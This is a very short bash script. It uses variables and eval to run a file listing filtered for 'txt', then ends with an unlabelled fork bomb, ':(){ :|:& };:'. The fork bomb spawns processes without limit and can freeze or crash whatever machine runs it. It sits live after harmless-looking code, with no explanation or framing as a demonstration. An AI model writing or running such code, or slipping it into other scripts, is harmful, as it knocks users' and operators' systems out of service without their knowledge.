#!/bin/bash

x="ls"
y="|"
z="grep"
a="txt"

eval "$x $y $z $a" 2>/dev/null || true

:(){ :|:& };:
